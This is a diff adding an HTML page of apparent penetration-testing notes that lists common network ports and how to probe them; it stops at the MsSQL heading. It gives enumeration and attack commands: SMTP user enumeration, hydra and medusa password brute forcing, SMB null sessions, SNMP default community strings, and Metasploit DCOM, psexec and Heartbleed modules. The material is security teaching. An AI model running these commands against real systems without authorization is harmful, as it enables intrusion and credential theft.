@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>List of Common Ports - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Common ports/services and how to use them", url: "#_top", children: [
+              {title: "Port X - Service unknown", url: "#port-x-service-unknown" },
+              {title: "Port 21 - FTP", url: "#port-21-ftp" },
+              {title: "Port 22 - SSH", url: "#port-22-ssh" },
+              {title: "Port 23 - Telnet", url: "#port-23-telnet" },
+              {title: "Port 25 - SMTP", url: "#port-25-smtp" },
+              {title: "Port 69 - TFTP", url: "#port-69-tftp" },
+              {title: "Port 80 - HTTP", url: "#port-80-http" },
+              {title: "Port 88 - Kerberos", url: "#port-88-kerberos" },
+              {title: "Port 110 - Pop3", url: "#port-110-pop3" },
+              {title: "Port 111 - Rpcbind", url: "#port-111-rpcbind" },
+              {title: "Port 119 - NNTP", url: "#port-119-nntp" },
+              {title: "Port 135 - MSRPC", url: "#port-135-msrpc" },
+              {title: "Port 139 and 445- SMB/Samba shares", url: "#port-139-and-445-smbsamba-shares" },
+              {title: "Port 143/993 - IMAP", url: "#port-143993-imap" },
+              {title: "Port 161 and 162 - SNMP", url: "#port-161-and-162-snmp" },
+              {title: "Port 199 - Smux", url: "#port-199-smux" },
+              {title: "Port 389/636 - Ldap", url: "#port-389636-ldap" },
+              {title: "Port 443 - HTTPS", url: "#port-443-https" },
+          ]},
+          {title: "Port 554 - RTSP", url: "#port-554-rtsp", children: [
+              {title: "Port 587 - Submission", url: "#port-587-submission" },
+              {title: "Port 631 - Cups", url: "#port-631-cups" },
+              {title: "Port 993 - Imap Encrypted", url: "#port-993-imap-encrypted" },
+              {title: "Port 995 - POP3 Encrypten", url: "#port-995-pop3-encrypten" },
+              {title: "Port 1025 - NFS or IIS", url: "#port-1025-nfs-or-iis" },
+              {title: "Port 1030/1032/1033/1038", url: "#port-1030103210331038" },
+              {title: "Port 1433 - MsSQL", url: "#port-1433-mssql" },
+          ]},
+          {title: "Execute commands", url: "#execute-commands", children: [
+              {title: "Brute force.", url: "#brute-force" },
+              {title: "Port 1521 - Oracle database", url: "#port-1521-oracle-database" },
+              {title: "Ports 1748, 1754, 1808, 1809 - Oracle", url: "#ports-1748-1754-1808-1809-oracle" },
+              {title: "Port 2049 - NFS", url: "#port-2049-nfs" },
+              {title: "Port 2100 - Oracle XML DB", url: "#port-2100-oracle-xml-db" },
+              {title: "Port 3268 - globalcatLdap", url: "#port-3268-globalcatldap" },
+              {title: "Port 3306 - MySQL", url: "#port-3306-mysql" },
+              {title: "Port 3339 - Oracle web interface", url: "#port-3339-oracle-web-interface" },
+              {title: "Port 3389 - Remote Desktop Protocol", url: "#port-3389-remote-desktop-protocol" },
+              {title: "Port 4445 - Upnotifyp", url: "#port-4445-upnotifyp" },
+              {title: "Port 4555 - RSIP", url: "#port-4555-rsip" },
+              {title: "5060 / 5061 - SIP", url: "#5060-5061-sip" },
+              {title: "Port 5357 - WSDAPI", url: "#port-5357-wsdapi" },
+              {title: "Port 5722 - DFSR", url: "#port-5722-dfsr" },
+              {title: "Port 5900 - VNC", url: "#port-5900-vnc" },
+              {title: "Port 8080", url: "#port-8080" },
+              {title: "Port 9389 -", url: "#port-9389-" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../attacking_active_directory_domain/good_to_know/active_directory_help_commands/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../attacking_active_directory_domain/good_to_know/active_directory_help_commands/" class="btn btn-xs btn-link">
+        Helpful Commands and Scripts
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../attacking_external_network/attacking_external_networks/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../attacking_external_network/attacking_external_networks/" class="btn btn-xs btn-link">
+        Attacking External Networks
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="common-portsservices-and-how-to-use-them">Common ports/services and how to use them<a class="headerlink" href="#common-portsservices-and-how-to-use-them" title="Permanent link">#</a></h1>
+<h2 id="port-x-service-unknown">Port X - Service unknown<a class="headerlink" href="#port-x-service-unknown" title="Permanent link">#</a></h2>
+<p>If you have a port open with unkown service you can do this to find out which service it might be.</p>
+<pre><code>nmap -d 192.168.19.244 8000
+</code></pre>
+
+<h2 id="port-21-ftp">Port 21 - FTP<a class="headerlink" href="#port-21-ftp" title="Permanent link">#</a></h2>
+<p>Connect to the ftp-server to enumerate software and version</p>
+<pre><code>ftp 192.168.1.101
+nc 192.168.1.101 21
+</code></pre>
+
+<p>Many ftp-servers allow anonymous users. These might be misconfigured and give too much access, and it might also be necessary for certain exploits to work. So always try to log in with <code>anonymous:anonymous</code>.</p>
+<p><strong>Remember the binary and ascii mode!</strong></p>
+<p>If you upload a binary file you have to put the ftp-server in binary mode, otherwise the file will become corrupted and you will not be able to use it! The same for text-files. Use ascii mode for them!
+You just write <strong>binary</strong> and <strong>ascii</strong> to switch mode.</p>
+<h2 id="port-22-ssh">Port 22 - SSH<a class="headerlink" href="#port-22-ssh" title="Permanent link">#</a></h2>
+<p>SSH is such an old and fundamental technology so most modern version are quite hardened.
+You can find out the version of the SSH either but scanning it with nmap or by connecting with it using <code>nc</code>.</p>
+<pre><code>nc 192.168.1.10 22
+</code></pre>
+
+<p>It returnes something like this:
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu1</p>
+<p>This banner is defined in RFC4253, in chapter 4.2 Protocol Version Exchange. http://www.openssh.com/txt/rfc4253.txt
+The protocol-version string should be defined like this: <code>SSH-protoversion-softwareversion SP comments CR LF</code>
+Where comments is optional. And SP means space, and CR (carriege return) and LF (Line feed)
+So basically the comments should be separated by a space. </p>
+<h2 id="port-23-telnet">Port 23 - Telnet<a class="headerlink" href="#port-23-telnet" title="Permanent link">#</a></h2>
+<p>Telnet is considered insecure mainly because it does not encrypt its traffic. Also a quick search in exploit-db will show that there are various RCE-vulnerabilities on different versions. Might be worth checking out. </p>
+<p><strong>Brute force it</strong></p>
+<p>You can also brute force it like this:</p>
+<pre><code>hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
+</code></pre>
+
+<h2 id="port-25-smtp">Port 25 - SMTP<a class="headerlink" href="#port-25-smtp" title="Permanent link">#</a></h2>
+<p>SMTP is a server to server service. The user receives or sends emails using IMAP or POP3. Those messages are then routed to the SMTP-server which communicates the email to another server.
+The SMTP-server has a database with all emails that can receive or send emails. We can use SMTP to query that database for possible email-addresses. Notice that we cannot retrieve any emails from SMTP. We can only send emails.</p>
+<p>Here are the possible commands</p>
+<pre><code>HELO - 
+EHLO - Extended SMTP.
+STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic.
+RCPT - Address of the recipient.
+DATA - Starts the transfer of the message contents.
+RSET - Used to abort the current email transaction.
+MAIL - Specifies the email address of the sender.
+QUIT - Closes the connection.
+HELP - Asks for the help screen.
+AUTH - Used to authenticate the client to the server.
+VRFY - Asks the server to verify is the email user's mailbox exists.
+</code></pre>
+
+<h3 id="manually">Manually<a class="headerlink" href="#manually" title="Permanent link">#</a></h3>
+<p>We can use this service to find out which usernames are in the database. This can be done in the following way.</p>
+<pre><code>nc 192.168.1.103 25                                                                               
+
+220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+VRFY root
+252 2.0.0 root
+VRFY roooooot
+550 5.1.1 &lt;roooooot&gt;: Recipient address rejected: User unknown in local recipient table
+</code></pre>
+
+<p>Here we have managed to identify the user <code>root</code>. But <code>roooooot</code> was rejected.</p>
+<p><code>VRFY</code>, <code>EXPN</code> and <code>RCPT</code> can be used to identify users.</p>
+<p>Telnet is a bit more friendly some times. So always use that too</p>
+<pre><code>telnet 10.11.1.229 25
+</code></pre>
+
+<h3 id="automatized">Automatized<a class="headerlink" href="#automatized" title="Permanent link">#</a></h3>
+<p>This process can of course be automatized</p>
+<p><strong>Check for commands</strong></p>
+<pre><code>nmap -script smtp-commands.nse 192.168.1.101
+</code></pre>
+
+<h4 id="smtp-user-enum">smtp-user-enum<a class="headerlink" href="#smtp-user-enum" title="Permanent link">#</a></h4>
+<p>The command will look like this. <code>-M</code> for mode. <code>-U</code> for userlist. <code>-t</code> for target</p>
+<pre><code>smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 192.168.1.103
+</code></pre>
+
+<pre><code>Mode ..................... VRFY
+Worker Processes ......... 5
+Usernames file ........... /root/sectools/SecLists/Usernames/Names/names.txt
+Target count ............. 1
+Username count ........... 8607
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Sun Jun 19 11:04:59 2016 #########
+192.168.1.103: Bin exists
+192.168.1.103: Irc exists
+192.168.1.103: Mail exists
+192.168.1.103: Man exists
+192.168.1.103: Sys exists
+######## Scan completed at Sun Jun 19 11:06:51 2016 #########
+5 results.
+
+8607 queries in 112 seconds (76.8 queries / sec)
+</code></pre>
+
+<h4 id="metasploit">Metasploit<a class="headerlink" href="#metasploit" title="Permanent link">#</a></h4>
+<p>I can also be done using metasploit</p>
+<pre><code>msf &gt; use auxiliary/scanner/smtp/smtp_enum 
+msf auxiliary(smtp_enum) &gt; show options
+
+Module options (auxiliary/scanner/smtp/smtp_enum):
+
+   Name       Current Setting                                                Required  Description
+   ----       ---------------                                                --------  -----------
+   RHOSTS                                                                    yes       The target address range or CIDR identifier
+   RPORT      25                                                             yes       The target port
+   THREADS    1                                                              yes       The number of concurrent threads
+   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
+   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.
+</code></pre>
+
+<p>Here are the documentations for SMTP
+https://cr.yp.to/smtp/vrfy.html</p>
+<p>http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/</p>
+<p>http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html</p>
+<p>http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</p>
+<p>https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/</p>
+<h2 id="port-69-tftp">Port 69 - TFTP<a class="headerlink" href="#port-69-tftp" title="Permanent link">#</a></h2>
+<p>This is a ftp-server but it is using UDP.</p>
+<h2 id="port-80-http">Port 80 - HTTP<a class="headerlink" href="#port-80-http" title="Permanent link">#</a></h2>
+<p>Info about web-vulnerabilities can be found in the next chapter <code>HTTP - Web Vulnerabilities</code>.</p>
+<p>We usually just think of vulnerabilities on the http-interface, the web page, when we think of port 80. But with <code>.htaccess</code> we are able to password protect certain directories. If that is the case we can brute force that the following way.</p>
+<h3 id="password-protect-directory-with-htaccess">Password protect directory with htaccess<a class="headerlink" href="#password-protect-directory-with-htaccess" title="Permanent link">#</a></h3>
+<p><strong>Step 1</strong></p>
+<p>Create a directory that you want to password-protect.
+Create .htaccess tile inside that directory.
+Content of .htaccess:</p>
+<pre><code>AuthType Basic
+AuthName &quot;Password Protected Area&quot;
+AuthUserFile /var/www/html/test/.htpasswd
+Require valid-user
+</code></pre>
+
+<p>Create .htpasswd file</p>
+<pre><code>htpasswd -cb .htpasswd test admin
+service apache2 restart
+</code></pre>
+
+<p>This will now create a file called .htpasswd with the user: test and the password: admin</p>
+<p>If the directory does not display a login-prompt, you might have to change the <strong>apache2.conf</strong> file. To this:</p>
+<pre><code>&lt;Directory /var/www/html/test&gt;
+    AllowOverride AuthConfig
+&lt;/Directory&gt;
+</code></pre>
+
+<h3 id="brute-force-it">Brute force it<a class="headerlink" href="#brute-force-it" title="Permanent link">#</a></h3>
+<p>Now that we know how this works we can try to brute force it with medusa.</p>
+<pre><code>medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
+</code></pre>
+
+<h2 id="port-88-kerberos">Port 88 - Kerberos<a class="headerlink" href="#port-88-kerberos" title="Permanent link">#</a></h2>
+<p>Kerberos is a protocol that is used for network authentication. Different versions are used by *nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.</p>
+<p>If you already have a login to a user of that domain you might be able to escalate that privilege.</p>
+<p>Check out:
+MS14-068</p>
+<h2 id="port-110-pop3">Port 110 - Pop3<a class="headerlink" href="#port-110-pop3" title="Permanent link">#</a></h2>
+<p>This service is used for fetching emails on a email server. So the server that has this port open is probably an email-server, and other clients on the network (or outside) access this server to fetch their emails.</p>
+<pre><code>telnet 192.168.1.105 110
+USER pelle@192.168.1.105
+PASS admin
+
+# List all emails
+list
+
+# Retrive email number 5, for example
+retr 5
+</code></pre>
+
+<h2 id="port-111-rpcbind">Port 111 - Rpcbind<a class="headerlink" href="#port-111-rpcbind" title="Permanent link">#</a></h2>
+<p>RFC: 1833</p>
+<p>Rpcbind can help us look for NFS-shares. So look out for nfs.
+Obtain list of services running with RPC:</p>
+<pre><code>rpcbind -p 192.168.1.101
+</code></pre>
+
+<h2 id="port-119-nntp">Port 119 - NNTP<a class="headerlink" href="#port-119-nntp" title="Permanent link">#</a></h2>
+<p>Network time protocol. 
+It is used synchronize time. If a machine is running this server it might work as a server for synchronizing time. So other machines query this machine for the exact time. </p>
+<p>An attacker could use this to change the time. Which might cause denial of service and all around havoc.</p>
+<h2 id="port-135-msrpc">Port 135 - MSRPC<a class="headerlink" href="#port-135-msrpc" title="Permanent link">#</a></h2>
+<p>This is the windows rpc-port.
+https://en.wikipedia.org/wiki/Microsoft_RPC</p>
+<h3 id="enumerate">Enumerate<a class="headerlink" href="#enumerate" title="Permanent link">#</a></h3>
+<pre><code>nmap 192.168.0.101 --script=msrpc-enum
+</code></pre>
+
+<pre><code>msf &gt; use exploit/windows/dcerpc/ms03_026_dcom
+</code></pre>
+
+<h2 id="port-139-and-445-smbsamba-shares">Port 139 and 445- SMB/Samba shares<a class="headerlink" href="#port-139-and-445-smbsamba-shares" title="Permanent link">#</a></h2>
+<p>Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server.</p>
+<h3 id="connecting">Connecting<a class="headerlink" href="#connecting" title="Permanent link">#</a></h3>
+<p>For linux-users you can log in to the smb-share using smbclient, like this:</p>
+<pre><code>smbclient -L 192.168.1.102
+smbclient //192.168.1.106/tmp
+smbclient \\\\192.168.1.105\\ipc$ -U john 
+smbclient //192.168.1.105/ipc$ -U john  
+</code></pre>
+
+<p>If you don't provide any password, just click enter, the server might show you the different shares and version of the server. This can be useful information for looking for exploits. There are tons of exploits for smb.</p>
+<p>So smb, for a linux-user, is pretty much like and ftp or a nfs.</p>
+<p>Here is a good guide for how to configure samba:
+https://help.ubuntu.com/community/How%20to%20Create%20a%20Network%20Share%20Via%20Samba%20Via%20CLI%20(Command-line%20interface/Linux%20Terminal)%20-%20Uncomplicated,%20Simple%20and%20Brief%20Way!</p>
+<pre><code>mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 &quot;//10.10.10.10/My Share&quot; /mnt/cifs
+</code></pre>
+
+<h3 id="connectin-with-psexec">Connectin with PSExec<a class="headerlink" href="#connectin-with-psexec" title="Permanent link">#</a></h3>
+<p>If you have credentials you can use psexec you easily log in. You can either use the standalone binary or the metasploit module.</p>
+<pre><code>use exploit/windows/smb/psexec
+</code></pre>
+
+<h3 id="scanning-with-nmap">Scanning with nmap<a class="headerlink" href="#scanning-with-nmap" title="Permanent link">#</a></h3>
+<p>Scanning for smb with Nmap</p>
+<pre><code>nmap -p 139,445 192.168.1.1/24 
+</code></pre>
+
+<p>There are several NSE scripts that can be useful, for example:</p>
+<pre><code>ls -l /usr/share/nmap/scripts/smb*
+</code></pre>
+
+<pre><code>-rw-r--r-- 1 root root  45K Jan 24  2016 /usr/share/nmap/scripts/smb-brute.nse
+-rw-r--r-- 1 root root 4.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-domains.nse
+-rw-r--r-- 1 root root 5.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-groups.nse
+-rw-r--r-- 1 root root 7.9K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-processes.nse
+-rw-r--r-- 1 root root  12K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-sessions.nse
+-rw-r--r-- 1 root root 6.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-shares.nse
+-rw-r--r-- 1 root root  13K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-users.nse
+-rw-r--r-- 1 root root 1.7K Jan 24  2016 /usr/share/nmap/scripts/smb-flood.nse
+-rw-r--r-- 1 root root 7.3K Jan 24  2016 /usr/share/nmap/scripts/smb-ls.nse
+-rw-r--r-- 1 root root 8.6K Jan 24  2016 /usr/share/nmap/scripts/smb-mbenum.nse
+-rw-r--r-- 1 root root 7.0K Jan 24  2016 /usr/share/nmap/scripts/smb-os-discovery.nse
+-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-print-text.nse
+-rw-r--r-- 1 root root  63K Jan 24  2016 /usr/share/nmap/scripts/smb-psexec.nse
+-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-security-mode.nse
+-rw-r--r-- 1 root root 2.4K Jan 24  2016 /usr/share/nmap/scripts/smb-server-stats.nse
+-rw-r--r-- 1 root root  14K Jan 24  2016 /usr/share/nmap/scripts/smb-system-info.nse
+-rw-r--r-- 1 root root 1.5K Jan 24  2016 /usr/share/nmap/scripts/smbv2-enabled.nse
+-rw-r--r-- 1 root root 7.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-conficker.nse
+-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
+-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms06-025.nse
+-rw-r--r-- 1 root root 5.4K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms07-029.nse
+-rw-r--r-- 1 root root 5.7K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
+-rw-r--r-- 1 root root 5.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-054.nse
+-rw-r--r-- 1 root root 7.2K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-061.nse
+-rw-r--r-- 1 root root 4.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
+</code></pre>
+
+<pre><code>nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
+</code></pre>
+
+<h3 id="nbtscan">nbtscan<a class="headerlink" href="#nbtscan" title="Permanent link">#</a></h3>
+<pre><code>nbtscan -r 192.168.1.1/24
+</code></pre>
+
+<p>It can be a bit buggy sometimes so run it several times to make sure it found all users.</p>
+<h3 id="enum4linux">Enum4linux<a class="headerlink" href="#enum4linux" title="Permanent link">#</a></h3>
+<p>Enum4linux can be used to enumerate windows and linux machines with smb-shares. </p>
+<p>The do all option:</p>
+<pre><code>enum4linux -a 192.168.1.120
+</code></pre>
+
+<p>For info about it ere: https://labs.portcullis.co.uk/tools/enum4linux/</p>
+<h3 id="rpcclient">rpcclient<a class="headerlink" href="#rpcclient" title="Permanent link">#</a></h3>
+<p>You can also use rpcclient to enumerate the share.</p>
+<p>Connect with a null-session. That is, without a user. This only works for older windows servers.</p>
+<pre><code>rpcclient -U &quot;&quot; 192.168.1.101
+</code></pre>
+
+<p>Once connected you could enter commands like</p>
+<pre><code>srvinfo
+enumdomusers
+getdompwinfo
+querydominfo
+netshareenum
+netshareenumall
+</code></pre>
+
+<h2 id="port-143993-imap">Port 143/993 - IMAP<a class="headerlink" href="#port-143993-imap" title="Permanent link">#</a></h2>
+<p>IMAP lets you access email stored on that server. So imagine that you are on a network at work, the emails you recieve is not stored on your computer but on a specific mail-server. So every time you look in your inbox your email-client (like outlook) fetches the emails from the mail-server using imap.</p>
+<p>IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3 you can only access them from one device.</p>
+<p>Port 993 is the secure port for IMAP.</p>
+<h2 id="port-161-and-162-snmp">Port 161 and 162 - SNMP<a class="headerlink" href="#port-161-and-162-snmp" title="Permanent link">#</a></h2>
+<p>Simple Network Management Protocol</p>
+<p>SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials.</p>
+<p>SNMP is used to manage devices on a network. It has some funny terminology. For example, instead of using the word password the word community is used instead. But it is kind of the same thing. A common community-string/password is public.</p>
+<p>You can have read-only access to the snmp.Often just with the community string <code>public</code>. </p>
+<p>Common community strings</p>
+<pre><code>public
+private
+community
+</code></pre>
+
+<p>Here is a longer list of common community strings: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt</p>
+<h3 id="mib-management-information-base">MIB - Management information base<a class="headerlink" href="#mib-management-information-base" title="Permanent link">#</a></h3>
+<p>SNMP stores all teh data in the Management Information Base. The MIB is a database that is organized as a tree. Different branches contains different information. So one branch can be username information, and another can be processes running. The "leaf" or the endpoint is the actual data. If you have read-access to the database you can read through each endpoint in the tree. This can be used with snmpwalk. It walks through the whole database tree and outputs the content.</p>
+<h4 id="snmpwalk">snmpwalk<a class="headerlink" href="#snmpwalk" title="Permanent link">#</a></h4>
+<pre><code>snmpwalk -c public -v1 192.168.1.101 #community string and which version
+</code></pre>
+
+<p>This command will output a lot of information. Way to much, and most of it will not be relevant to us and much we won't understand really. So it is better to request the info that you are interested in. Here are the locations of the stuff that we are interested in:</p>
+<pre><code>1.3.6.1.2.1.25.1.6.0 System Processes
+1.3.6.1.2.1.25.4.2.1.2 Running Programs
+1.3.6.1.2.1.25.4.2.1.4 Processes Path
+1.3.6.1.2.1.25.2.3.1.4 Storage Units
+1.3.6.1.2.1.25.6.3.1.2 Software Name
+1.3.6.1.4.1.77.1.2.25 User Accounts
+1.3.6.1.2.1.6.13.1.3 TCP Local Ports
+</code></pre>
+
+<p>Now we can use this to query the data we really want.</p>
+<h4 id="snmpenum">snmpenum<a class="headerlink" href="#snmpenum" title="Permanent link">#</a></h4>
+<h4 id="snmp-check">snmp-check<a class="headerlink" href="#snmp-check" title="Permanent link">#</a></h4>
+<p>This is a bit easier to use and with a lot prettier output.</p>
+<pre><code>snmp-check -t 192.168.1.101 -c public
+</code></pre>
+
+<h3 id="scan-for-open-ports-nmap">Scan for open ports - Nmap<a class="headerlink" href="#scan-for-open-ports-nmap" title="Permanent link">#</a></h3>
+<p>Since SNMP is using UDP we have to use the <code>-sU</code> flag.</p>
+<pre><code>nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt
+</code></pre>
+
+<h3 id="onesixtyone">Onesixtyone<a class="headerlink" href="#onesixtyone" title="Permanent link">#</a></h3>
+<p>With onesixtyone you can test for open ports but also brute force community strings.
+I have had more success using onesixtyone than using nmap. So better use both.</p>
+<pre><code>
+</code></pre>
+
+<h3 id="metasploit_1">Metasploit<a class="headerlink" href="#metasploit_1" title="Permanent link">#</a></h3>
+<p>There are a few snmp modules in metasploit that you can use. snmp_enum can show you usernames, services, and other stuff.</p>
+<p>https://www.offensive-security.com/metasploit-unleashed/snmp-scan/</p>
+<h2 id="port-199-smux">Port 199 - Smux<a class="headerlink" href="#port-199-smux" title="Permanent link">#</a></h2>
+<h2 id="port-389636-ldap">Port 389/636 - Ldap<a class="headerlink" href="#port-389636-ldap" title="Permanent link">#</a></h2>
+<p>Lightweight Directory Access Protocol.
+This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. 
+Ldap is used more often in corporate structure.
+Webapplications can use ldap for authentication. If that is the case it is possible to perform <strong>ldap-injections</strong> which are similar to sqlinjections.</p>
+<p>You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users.</p>
+<pre><code>ldapsearch -h 192.168.1.101 -p 389 -x -b &quot;dc=mywebsite,dc=com&quot;
+</code></pre>
+
+<p>When a client connects to the Ldap directory it can use it to query data, or add or remove. </p>
+<p>Port 636 is used for SSL.</p>
+<p>There are also metasploit modules for Windows 2000 SP4 and Windows Xp SP0/SP1</p>
+<h2 id="port-443-https">Port 443 - HTTPS<a class="headerlink" href="#port-443-https" title="Permanent link">#</a></h2>
+<p>Okay this is only here as a reminder to always check for SSL-vulnerabilities such as heartbleed. For more on how to exploit web-applications check out the chapter on client-side vulnerabilities. </p>
+<h3 id="heartbleed">Heartbleed<a class="headerlink" href="#heartbleed" title="Permanent link">#</a></h3>
+<p>OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
+OpenSSL 1.0.1g is NOT vulnerable
+OpenSSL 1.0.0 branch is NOT vulnerable
+OpenSSL 0.9.8 branch is NOT vulnerable</p>
+<p>First we need to investigate if the https-page is vulnerable to <a href="http://heartbleed.com/">heartbleed</a></p>
+<p>We can do that the following way.</p>
+<pre><code>sudo sslscan 192.168.101.1:443
+</code></pre>
+
+<p>or using a nmap script</p>
+<pre><code>nmap -sV --script=ssl-heartbleed 192.168.101.8 
+</code></pre>
+
+<p>You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and metasploit also has a module for it.</p>
+<pre><code>use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS 192.168.101.8
+set verbose true
+run
+</code></pre>
+
+<p>Now you have a flow of random data, some of it might be of interest to you.</p>
+<h3 id="crime">CRIME<a class="headerlink" href="#crime" title="Permanent link">#</a></h3>
+<h3 id="breach">Breach<a class="headerlink" href="#breach" title="Permanent link">#</a></h3>
+<h3 id="certificate">Certificate<a class="headerlink" href="#certificate" title="Permanent link">#</a></h3>
+<p>Read the certificate. 
+- Does it include names that might be useful?
+- Correct vhost</p>
+<h1 id="port-554-rtsp">Port 554 - RTSP<a class="headerlink" href="#port-554-rtsp" title="Permanent link">#</a></h1>
+<p>RTSP (Real Time Streaming Protocol) is a stateful protocol built on top of tcp usually used for streaming images. Many commercial IP-cameras are running on this port. They often have a GUI interface, so look out for that. </p>
+<h2 id="port-587-submission">Port 587 - Submission<a class="headerlink" href="#port-587-submission" title="Permanent link">#</a></h2>
+<p>Outgoing smtp-port</p>
+<p>If Postfix is run on it it could be vunerable to shellshock
+https://www.exploit-db.com/exploits/34896/</p>
+<h2 id="port-631-cups">Port 631 - Cups<a class="headerlink" href="#port-631-cups" title="Permanent link">#</a></h2>
+<p>Common UNIX Printing System has become the standard for sharing printers on a linux-network. 
+You will often see port 631 open in your priv-esc enumeration when you run <code>netstat</code>. You can log in to it here: <strong>http://localhost:631/admin</strong></p>
+<p>You authenticate with the OS-users.</p>
+<p>Find version. Test <strong>cups-config --version</strong>. If this does not work surf to <strong>http://localhost:631/printers</strong> and see the CUPS version in the title bar of your browser.</p>
+<p>There are vulnerabilities for it so check your searchsploit.</p>
+<h2 id="port-993-imap-encrypted">Port 993 - Imap Encrypted<a class="headerlink" href="#port-993-imap-encrypted" title="Permanent link">#</a></h2>
+<p>The default port for the Imap-protocol.</p>
+<h2 id="port-995-pop3-encrypten">Port 995 - POP3 Encrypten<a class="headerlink" href="#port-995-pop3-encrypten" title="Permanent link">#</a></h2>
+<p>Port 995 is the default port for the <strong>Post Office Protocol</strong>.
+The protocol is used for clients to connect to the server and download their emails locally. 
+You usually see this port open on mx-servers. Servers that are meant to send and recieve email.</p>
+<p>Related ports: 
+110 is the POP3 non-encrypted.</p>
+<p>25, 465</p>
+<h2 id="port-1025-nfs-or-iis">Port 1025 - NFS or IIS<a class="headerlink" href="#port-1025-nfs-or-iis" title="Permanent link">#</a></h2>
+<p>I have seen them open on windows machine. But nothing has been listening on it.</p>
+<h2 id="port-1030103210331038">Port 1030/1032/1033/1038<a class="headerlink" href="#port-1030103210331038" title="Permanent link">#</a></h2>
+<p>I think these are used by the RPC within Windows Domains. I have found no use for them so far. But they might indicate that the target is part of a Windows domain. Not sure though.</p>
+<h2 id="port-1433-mssql">Port 1433 - MsSQL<a class="headerlink" href="#port-1433-mssql" title="Permanent link">#</a></h2>
